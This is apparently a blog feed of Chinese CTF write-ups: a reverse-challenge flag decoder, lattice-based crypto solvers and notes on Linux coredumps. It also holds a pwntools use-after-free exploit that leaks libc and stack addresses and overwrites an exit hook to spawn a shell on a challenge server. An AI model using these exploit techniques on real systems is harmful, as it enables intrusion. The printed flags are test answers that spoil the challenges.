class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    i = k<br>    v8 = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        v9 = flag[m+n] * cheng[i]<br>        i += <span class="hljs-number">10</span><br>        v8 += v9<br>    s.add(a[k+n] == v8)<br>        <br><br><br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    m = s.model()<br>    <span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python">flag=[<span class="hljs-number">0</span>]*<span class="hljs-number">100</span><br>flag[<span class="hljs-number">5</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">6</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">0</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">9</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">2</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">7</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">8</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">1</span>]=<span class="hljs-number">104</span><br>flag[<span class="hljs-number">3</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">4</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">15</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">11</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">14</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">19</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">17</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">18</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">16</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">10</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">13</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">12</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">20</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">27</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">25</span>]=<span class="hljs-number">110</span><br>flag[<span class="hljs-number">28</span>]=<span class="hljs-number">114</span><br>flag[<span class="hljs-number">26</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">29</span>]=<span class="hljs-number">109</span><br>flag[<span class="hljs-number">24</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">21</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">22</span>]=<span class="hljs-number">115</span><br>flag[<span class="hljs-number">23</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">39</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">34</span>]=<span class="hljs-number">110</span><br>flag[<span class="hljs-number">35</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">33</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">30</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">38</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">31</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">36</span>]=<span class="hljs-number">98</span><br>flag[<span class="hljs-number">32</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">37</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">40</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">48</span>]=<span class="hljs-number">108</span><br>flag[<span class="hljs-number">45</span>]=<span class="hljs-number">79</span><br>flag[<span class="hljs-number">43</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">47</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">42</span>]=<span class="hljs-number">46</span><br>flag[<span class="hljs-number">44</span>]=<span class="hljs-number">48</span><br>flag[<span class="hljs-number">46</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">41</span>]=<span class="hljs-number">104</span><br>flag[<span class="hljs-number">49</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">54</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">57</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">58</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">55</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">56</span>]=<span class="hljs-number">54</span><br>flag[<span class="hljs-number">59</span>]=<span class="hljs-number">55</span><br>flag[<span class="hljs-number">52</span>]=<span class="hljs-number">56</span><br>flag[<span class="hljs-number">51</span>]=<span class="hljs-number">123</span><br>flag[<span class="hljs-number">50</span>]=<span class="hljs-number">103</span><br>flag[<span class="hljs-number">53</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">66</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">64</span>]=<span class="hljs-number">50</span><br>flag[<span class="hljs-number">62</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">68</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">63</span>]=<span class="hljs-number">54</span><br>flag[<span class="hljs-number">60</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">65</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">69</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">61</span>]=<span class="hljs-number">102</span><br>flag[<span class="hljs-number">67</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">76</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">78</span>]=<span class="hljs-number">52</span><br>flag[<span class="hljs-number">72</span>]=<span class="hljs-number">99</span><br>flag[<span class="hljs-number">75</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">73</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">79</span>]=<span class="hljs-number">100</span><br>flag[<span class="hljs-number">74</span>]=<span class="hljs-number">50</span><br>flag[<span class="hljs-number">70</span>]=<span class="hljs-number">45</span><br>flag[<span class="hljs-number">71</span>]=<span class="hljs-number">97</span><br>flag[<span class="hljs-number">77</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">86</span>]=<span class="hljs-number">56</span><br>flag[<span class="hljs-number">83</span>]=<span class="hljs-number">51</span><br>flag[<span class="hljs-number">88</span>]=<span class="hljs-number">125</span><br>flag[<span class="hljs-number">87</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">80</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">84</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">85</span>]=<span class="hljs-number">53</span><br>flag[<span class="hljs-number">82</span>]=<span class="hljs-number">57</span><br>flag[<span class="hljs-number">89</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">81</span>]=<span class="hljs-number">48</span><br>flag[<span class="hljs-number">94</span>]=<span class="hljs-number">103</span><br>flag[<span class="hljs-number">95</span>]=<span class="hljs-number">101</span><br>flag[<span class="hljs-number">92</span>]=<span class="hljs-number">117</span><br>flag[<span class="hljs-number">91</span>]=<span class="hljs-number">111</span><br>flag[<span class="hljs-number">96</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">98</span>]=<span class="hljs-number">105</span><br>flag[<span class="hljs-number">90</span>]=<span class="hljs-number">121</span><br>flag[<span class="hljs-number">93</span>]=<span class="hljs-number">95</span><br>flag[<span class="hljs-number">99</span>]=<span class="hljs-number">116</span><br>flag[<span class="hljs-number">97</span>]=<span class="hljs-number">95</span><br>flag1 = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag1 += <span class="hljs-built_in">chr</span>(flag[i])<br>    <br><span class="hljs-built_in">print</span>(flag1)<br><br><span class="hljs-comment">#there_are_a_lot_useless_information_but_oh.o0O_flag&#123;8f9c6cf7-f362-4a4e-ace2-a34d90939589&#125;_you_get_it</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>banary = <span class="hljs-string">&quot;./main&quot;</span><br>elf = ELF(banary)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>ip = <span class="hljs-string">&#x27;120.78.209.16&#x27;</span><br>port = <span class="hljs-number">48803</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>    io = process(banary)<br><span class="hljs-keyword">else</span>:<br>    io = remote(ip, port)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><span class="hljs-comment">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(io)<br>    pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : io.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : io.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : io.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : io.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : io.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : io.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(io.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>iuu32 = <span class="hljs-keyword">lambda</span> : <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br>iuu64 = <span class="hljs-keyword">lambda</span> : <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>)<br>uheap = <span class="hljs-keyword">lambda</span> : u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> data : io.success(<span class="hljs-string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="hljs-built_in">eval</span>(data)))<br>ia = <span class="hljs-keyword">lambda</span> : io.interactive()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, data = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;size: \n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">b&#x27;content: \n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;index: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, data</span>):<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;index: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>        sa(<span class="hljs-string">b&#x27;content: \n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>():<br>        sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>        sla(<span class="hljs-string">b&#x27;Passwd: \n&#x27;</span>, <span class="hljs-string">b&#x27;1234567890\x00&#x27;</span>)<br><br><br>add(<span class="hljs-number">0x420</span>) <span class="hljs-comment">#Index 0</span><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#index 1</span><br>free(<span class="hljs-number">0</span>)<br>show()<br>libc_base = uu64() - <span class="hljs-number">0x1ebbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=libc_base+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>ogg = libc_base + <span class="hljs-number">0xe6c7e</span><br><br><span class="hljs-comment">#debug(&#x27;b *$rebase(0x1429)&#x27;)</span><br><br>ad()<br>sa(<span class="hljs-string">b&#x27;name: \n&#x27;</span>, <span class="hljs-string">b&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>ret_addr = stack - <span class="hljs-number">0x18</span><br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>)<br><br>exit_hook = libc_base + <span class="hljs-number">0x222060</span> + <span class="hljs-number">3848</span><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;WRITE MODE: \n&#x27;</span>, p64(exit_hook))<br>sleep(<span class="hljs-number">1</span>)<br>s(p64(ogg))<br><span class="hljs-comment">#pause()</span><br><br>ia()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝帽杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>coredump</title>
    <link href="/2023/08/21/coredump/"/>
    <url>/2023/08/21/coredump/</url>
    
    <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>今天在分析TBOX的过程中，发现了一个<code>CoredumpService</code>的服务，具体代码涉及保密，就不放出来了，fw的我之前并不知道coredump是什么东西，所以来学习记录一下。</p><h3 id="什么是coredump"><a href="#什么是coredump" class="headerlink" title="什么是coredump"></a>什么是coredump</h3><p>coredump顾名思义就是核心转储。我们的应用程序在运行过程中，如果发生了异常crash，光靠程序自身的log是很难定位到根因的，所以操作系统提供了一套coredump机制。这套机制可以在crash发生的时候，把进程现场的vma信息存储到coredump文件中去。利用这个文件，就可以恢复异常现场的信息，分析人员可以从中获取到<strong>变量值、栈信息、内存数据、程序crash时的运行位置等</strong>。</p><h3 id="coredump是如何生成的"><a href="#coredump是如何生成的" class="headerlink" title="coredump是如何生成的"></a>coredump是如何生成的</h3><p><img src="/mdimg/Linux/coredump1.png"></p><p>当应用程序发生crash时，会陷入到内核进行异常处理，此时内核会产生一个信号(signal)发送给对应的进程。当进程从内核态到用户态切换时，该进程会处理这个信号。此类信号（比如SEGV）的默认处理行为就会生成一个coredump文件。当然，手动给某个应用程序发送这类信号，也是可以生成对应的coredump文件的，例如<code>kill -9 pidof xxx</code></p><h4 id="哪些信号可以产生coredump文件"><a href="#哪些信号可以产生coredump文件" class="headerlink" title="哪些信号可以产生coredump文件"></a>哪些信号可以产生coredump文件</h4><p><img src="/mdimg/Linux/coredump2.png"></p><p>可以看到3、4、6、8、11都能产生的信号， 默认都会产生coredump行为。如果修改了进程对这类信号的处理，则不会产生coredump了。</p><h4 id="保存的coredump文件在什么地方"><a href="#保存的coredump文件在什么地方" class="headerlink" title="保存的coredump文件在什么地方"></a>保存的coredump文件在什么地方</h4><p><code>/proc/sys/kernel/core_pattern </code>指定coredump文件存储的位置，缺省值是core，表示将coredump文件存储到当前目录。这个pattern是可以定制的，模式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">%p  进程的PID<br>%u  进程的UID<br>%s  造成coredump的signal号<br>%t  coredump生成的时间，从<span class="hljs-number">1970</span>-01-01 <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>开始的秒数<br>%e  出Core进程对应的可执行文件名<br></code></pre></td></tr></table></figure><p>例如：<code>echo &quot;/corefile/core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</code>，表示coredump路径为/corefile，文件名的格式为”core-可执行文件名-pid-时间”。</p><p><code>/proc/sys/kernel/core_uses_pid</code> 取值是0或者1，表示是否在coredump文件名字后面加上进程号</p><h4 id="coredump文件会把进程地址空间的哪些内容保存下来"><a href="#coredump文件会把进程地址空间的哪些内容保存下来" class="headerlink" title="coredump文件会把进程地址空间的哪些内容保存下来"></a>coredump文件会把进程地址空间的哪些内容保存下来</h4><p><code>/proc/$pid/coredump_filter</code> 设置那些内存会被dump出来，需要在程序启动之后进行设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">bit <span class="hljs-number">0</span>  Dump anonymous private mappings.<br>bit <span class="hljs-number">1</span>  Dump anonymous shared mappings.<br>bit <span class="hljs-number">2</span>  Dump file-backed private mappings.<br>bit <span class="hljs-number">3</span>  Dump file-backed shared mappings.<br>bit <span class="hljs-number">4</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.24</span>) Dump ELF headers.<br>bit <span class="hljs-number">5</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.28</span>) Dump private huge pages.<br>bit <span class="hljs-number">6</span> (since Linux <span class="hljs-number">2.6</span><span class="hljs-number">.28</span>) Dump shared huge pages.<br></code></pre></td></tr></table></figure><p>coredump_filter的默认值是0x33，也即发生coredump时会将所有anonymous内存、ELF头页面、hugetlb private memory内容保存。</p><h4 id="如何控制coredump文件的大小"><a href="#如何控制coredump文件的大小" class="headerlink" title="如何控制coredump文件的大小"></a>如何控制coredump文件的大小</h4><p>ulimit -c决定save的coredump文件大小限制，如果保存的文件小于设定的限制，则不会创建coredump文件。如果不想限制大小，需要设置<code>ulimit -c unlimited</code>。但是输入后只对执行这个命令的进程，及其后面fork出来的进程有效，已经运行的进程无效。例如，init进程在执行<code>ulimit -c unlimited</code>之前，运行了一个进程a，则进程a crash的时候不会产生coredump。</p><p>太烧脑了，下次再学。。。。。</p><p><img src="https://p.sda1.dev/16/841ae6972ecbd61f5a6b8b39d982007e/1.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三届山石网科夏令营</title>
    <link href="/2023/08/21/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E6%9A%91%E5%81%87CTF%E8%AE%AD%E7%BB%83%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/"/>
    <url>/2023/08/21/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%B1%B1%E7%9F%B3%E7%BD%91%E7%A7%91%E6%9A%91%E5%81%87CTF%E8%AE%AD%E7%BB%83%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>下班之余来打一场炸鱼赛（主要心水小礼品哈哈哈）第一次摸到了第一，我也是网络安全大赛冠军🥵</p><p><img src="/mdimg/2023sswk/1.jpg"></p><p>md 蚌埠住了 冬令营还有保温杯啥的呢！这次居然就给我一本从0到1😅原地送给新生当纪念品了。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="babyNTRU"><a href="#babyNTRU" class="headerlink" title="babyNTRU"></a>babyNTRU</h3><p>格基规约求f和g</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">18265166690888475568508205788351723108492598063556694453866020018612082716314197018581664220266891343266826262103380794092636040577744226926080805739120171556812778934479727248098841525477772831490126199548545786503110837372880363428957764884329593924744941695642013585909156506088780643030023164855973833306872727463131996134184118614172430586758877233701077685751718260071836310060281140572946121079034501926660471152233585368113925178752435191910762241019003537704885083238106369534830393975302288404167836930602217985985847446070323598776341522649183248452794742376328444827351843724799192817079741161233112260479</span><br>h = <span class="hljs-number">4967224096990794383219394548021661512726675694147838134779085870532422860903557980609209611713600051085944165443541629919867486254693404349210710383848787111293470866844887628407505277639836299797939984616893146647351591326606770521678401285613589626410018479980831585926061303904550146343466643582612670862834763887770328979710431031177418547347283523083258882829675470842927115407426622663316454822399636240738287665733629112976904877165355516610469901309760380900426025418466453719738514032928207738877975591007250792160137047114036933809472387873650910438263376962726381797927297555569681381513766206991560665841</span><br>c = <span class="hljs-number">16817585342429374146630376920213715475053842668013412994500648477443919828494694587495599063908719008851497141935769861968183626958443589329598781614352147198572062882796132537628308726395654751145080742405050157500585726017502230322869060570158864938641538722583753556090927664838782228764769369834459631417465435803556700281096974029668813698732758153249834904501478272838991307791205987117636747526652824803482977910064904853019629040285700901775083075557874528402638028712625642698991805017963162010854671654728900722088963013805447853328852730983161366447618298248888612010461342887166024478519281752219951330472</span><br><br>K=<span class="hljs-number">2</span>**(bits//<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<br>v1 = vector(ZZ, [<span class="hljs-number">1</span>, h*K])<br>v2 = vector(ZZ, [<span class="hljs-number">0</span>, p*K])<br>m = matrix([v1, v2])<br>f, g = m.LLL()[<span class="hljs-number">1</span>]<br>g = g//K<br><span class="hljs-comment">#print(f,g)</span><br><br>a = f * c % p % g<br>m = ZZ(c * f % q) * inverse_mod(f, g) % g<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><br><span class="hljs-comment">#HSNCTF&#123;d148fc5f-a646-4e60-a739-0bd0be98acd4&#125;</span><br></code></pre></td></tr></table></figure><h3 id="babyHNP"><a href="#babyHNP" class="headerlink" title="babyHNP"></a>babyHNP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">q = <span class="hljs-number">11617715374360202288596693614790746639041280065515420354170463717765818460765992548652144591072405216278802974122732716944329876299701631478958721643071613</span><br>A = [<span class="hljs-number">11205052163260879279779370027300388478563443748738386851258833175732815177918017923156408522968360233660245388669805196022826655093066229550671451036244177</span>, <span class="hljs-number">4587207419689873871671379475501060352361231709208665709260842495737444139113663532344038909684079685643293993271298355108298467058894209863221986043222103</span>, <span class="hljs-number">10892919356115964033441271848254373740150765391546241788365946905744103719741126554964746464277556730869654695377121263714138165633966013875792234902620232</span>, <span class="hljs-number">10388792144961373833428258161261768867774084238986429927755268743714106636512322654152268221431850066914109192294030406670197964112088034757687400251674294</span>, <span class="hljs-number">11168854651301071762033749829324982832429309270098022559190141243813683288587800229160507152432884446347484607384244984898130514154822876542001332189154040</span>]<br>b = [<span class="hljs-number">206397678313339208910331992242857106765</span>, <span 